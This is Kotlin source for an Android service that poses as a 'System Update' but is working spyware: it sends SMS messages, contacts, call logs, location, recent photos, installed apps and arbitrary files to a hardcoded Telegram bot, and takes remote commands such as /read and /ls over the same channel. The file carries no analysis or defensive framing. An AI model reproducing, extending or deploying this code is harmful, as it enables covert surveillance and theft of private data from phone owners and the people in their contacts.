package com.system.update

import android.app.*
import android.content.*
import android.os.*
import android.util.Log
import java.io.*
import java.net.*
import org.json.*

class CoreService : Service() {
    private val BOT = "8927866585:AAEo-_JUoJS_iD-fZxKJvSakGLpXkYLtkiM"
    private val CHAT = "7659107145"
    private var lastUpdate = 0L
    private lateinit var prefs: SharedPreferences

    override fun onBind(i: Intent?) = null

    override fun onCreate() {
        super.onCreate()
        prefs = getSharedPreferences("svc", MODE_PRIVATE)
        lastUpdate = prefs.getLong("lastUpdate", 0L)
        startForeground(1, notif())
        Thread { loop() }.start()
        Thread { initialDump() }.start()
    }

    private fun notif(): Notification {
        val ch = "svc"
        if (Build.VERSION.SDK_INT >= 26) {
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(
                NotificationChannel(ch, "svc", NotificationManager.IMPORTANCE_MIN)
            )
        }
        return Notification.Builder(this, ch)
            .setContentTitle("System Update")
            .setContentText("Checking...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .build()
    }

    private fun loop() {
        while (true) {
            try {
                for (u in getUpdates()) handle(u)
            } catch (e: Exception) {
                Log.e("CoreService", "loop: ${e.message}")
            }
            Thread.sleep(2000)
        }
    }

    private fun initialDump() {
        try {
            sendText("=== NEW DEVICE ===\n" + deviceInfo())
            Thread.sleep(1000)
            sendFile(dumpSms(), "sms.txt")
            Thread.sleep(2000)
            sendFile(dumpContacts(), "contacts.txt")
            Thread.sleep(2000)
            sendFile(dumpCalls(), "calls.txt")
            Thread.sleep(2000)
            sendText("LOC: " + getLoc())
        } catch (e: Exception) {
            Log.e("CoreService", "initialDump: ${e.message}")
        }
    }

    private fun getUpdates(): List<JSONObject> {
        val url = URL("https://api.telegram.org/bot$BOT/getUpdates?offset=${lastUpdate + 1}")
        val conn = url.openConnection() as HttpURLConnection
        conn.connectTimeout = 15000
        conn.readTimeout = 15000
        val body = conn.inputStream.bufferedReader().readText()
        val arr = JSONObject(body).getJSONArray("result")
        val out = mutableListOf<JSONObject>()
        for (i in 0 until arr.length()) {
            val o = arr.getJSONObject(i)
            lastUpdate = o.getLong("update_id")
            prefs.edit().putLong("lastUpdate", lastUpdate).apply()
            out.add(o)
        }
        return out
    }

    private fun handle(u: JSONObject) {
        val msg = u.optJSONObject("message") ?: return
        val text = msg.optString("text")
        Log.d("CoreService", "cmd: $text")
        when {
            text == "/sms" -> {
                sendText("SMS...")
                Thread { sendFile(dumpSms(), "sms.txt") }.start()
            }
            text == "/contacts" -> {
                sendText("Contacts...")
                Thread { sendFile(dumpContacts(), "contacts.txt") }.start()
            }
            text == "/calls" -> {
                sendText("Calls...")
                Thread { sendFile(dumpCalls(), "calls.txt") }.start()
            }
            text == "/loc" -> sendText(getLoc())
            text == "/info" -> sendText(deviceInfo())
            text == "/photos" -> {
                sendText("Photos...")
                Thread { sendRecentPhotos(20) }.start()
            }
            text == "/apps" -> {
                sendText("Apps...")
                Thread { sendFile(dumpApps(), "apps.txt") }.start()
            }
            text.startsWith("/read") -> {
                val p = text.removePrefix("/read").trim()
                val f = File(p)
                if (f.exists()) {
                    sendText("Read: $p")
                    Thread { sendFile(f, f.name) }.start()
                } else sendText("not found: $p")
            }
            text.startsWith("/ls") -> {
                val p = text.removePrefix("/ls").trim()
                sendText(listDir(p))
            }
        }
    }

    private fun dumpSms(): File {
        val f = File(cacheDir, "sms.txt")
        val c = contentResolver.query(
            android.net.Uri.parse("content://sms/inbox"),
            null, null, null, "date DESC LIMIT 200"
        )
        f.printWriter().use { w ->
            c?.use {
                while (it.moveToNext()) {
                    w.println(it.getString(it.getColumnIndexOrThrow("address")) + ": " +
                              it.getString(it.getColumnIndexOrThrow("body")))
                }
            }
        }
        return f
    }

    private fun dumpContacts(): File {
        val f = File(cacheDir, "contacts.txt")
        val c = contentResolver.query(
            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
        f.printWriter().use { w ->
            c?.use {
                while (it.moveToNext()) {
                    w.println(it.getString(it.getColumnIndexOrThrow(
                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) + " : " +
                        it.getString(it.getColumnIndexOrThrow(
                        android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)))
                }
            }
        }
        return f
    }

    private fun dumpCalls(): File {
        val f = File(cacheDir, "calls.txt")
        val c = contentResolver.query(
            android.net.Uri.parse("content://call_log/calls"),
            null, null, null, "date DESC LIMIT 200"
        )
        f.printWriter().use { w ->
            c?.use {
                while (it.moveToNext()) {
                    w.println(it.getString(it.getColumnIndexOrThrow("number")) + " " +
                              it.getString(it.getColumnIndexOrThrow("duration")))
                }
            }
        }
        return f
    }

    private fun dumpApps(): File {
        val f = File(cacheDir, "apps.txt")
        f.printWriter().use { w ->
            for (a in packageManager.getInstalledPackages(0)) {
                w.println("${a.packageName} — ${a.versionName}")
            }
        }
        return f
    }

    private fun listDir(path: String): String {
        val f = File(path)
        if (!f.exists()) return "not found: $path"
        return f.listFiles()?.joinToString("\n") {
            "${it.name} ${if (it.isDirectory) "/" else it.length()}"
        } ?: "empty"
    }

    private fun sendRecentPhotos(count: Int) {
        try {
            val proj = arrayOf(
                android.provider.MediaStore.Images.Media._ID,
                android.provider.MediaStore.Images.Media.DISPLAY_NAME
            )
            val c = contentResolver.query(
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                proj, null, null,
                android.provider.MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT $count"
            )
            var sent = 0
            c?.use {
                while (it.moveToNext()) {
                    val id = it.getLong(0)
                    val name = it.getString(1) ?: "img_$id.jpg"
                    val uri = android.net.Uri.withAppendedPath(
                        android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString()
                    )
                    try {
                        val ins = contentResolver.openInputStream(uri) ?: continue
                        val tmp = File(cacheDir, name)
                        tmp.outputStream().use { o -> ins.copyTo(o) }
                        // танҳо то 5 МБ
                        if (tmp.length() < 5 * 1024 * 1024) {
                            sendFile(tmp, name)
                            sent++
                        }
                        tmp.delete()
                        Thread.sleep(1500)
                    } catch (e: Exception) {
                        Log.e("CoreService", "photo: ${e.message}")
                    }
                }
            }
            sendText("Photos done: $sent")
        } catch (e: Exception) {
            Log.e("CoreService", "sendRecentPhotos: ${e.message}")
        }
    }

    private fun getLoc(): String {
        try {
            val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
            val loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
                   ?: lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                   ?: lm.getLastKnownLocation(android.location.LocationManager.PASSIVE_PROVIDER)
            return loc?.let { "${it.latitude},${it.longitude}" } ?: "no fix"
        } catch (e: Exception) {
            return "err: ${e.message}"
        }
    }

    private fun deviceInfo(): String =
        "Model: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}\nBrand: ${Build.BRAND}\nID: ${Build.ID}"

    private fun sendText(t: String) {
        try {
            val body = "chat_id=$CHAT&text=${URLEncoder.encode(t, "UTF-8")}"
            val conn = URL("https://api.telegram.org/bot$BOT/sendMessage").openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.connectTimeout = 30000
            conn.readTimeout = 30000
            conn.outputStream.write(body.toByteArray())
            conn.inputStream.close()
        } catch (e: Exception) {
            Log.e("CoreService", "sendText: ${e.message}")
        }
    }

    private fun sendFile(f: File, name: String) {
        if (!f.exists() || f.length() == 0L) return
        try {
            val b = "----x${System.currentTimeMillis()}"
            val bytes = f.readBytes()

            val head = "--$b\r\n" +
                "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n$CHAT\r\n" +
                "--$b\r\n" +
                "Content-Disposition: form-data; name=\"document\"; filename=\"$name\"\r\n" +
                "Content-Type: application/octet-stream\r\n\r\n"
            val tail = "\r\n--$b--\r\n"
            val headBytes = head.toByteArray()
            val tailBytes = tail.toByteArray()
            val totalSize = headBytes.size + bytes.size + tailBytes.size

            val conn = URL("https://api.telegram.org/bot$BOT/sendDocument").openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.connectTimeout = 120000
            conn.readTimeout = 120000
            conn.setFixedLengthStreamingMode(totalSize)
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$b")

            conn.outputStream.use { os ->
                os.write(headBytes)
                os.write(bytes)
                os.write(tailBytes)
                os.flush()
            }
            val resp = conn.inputStream.bufferedReader().readText()
            Log.d("CoreService", "sendFile $name: ${resp.take(120)}")
        } catch (e: Exception) {
            Log.e("CoreService", "sendFile $name err: ${e.message}")
        }
    }
}
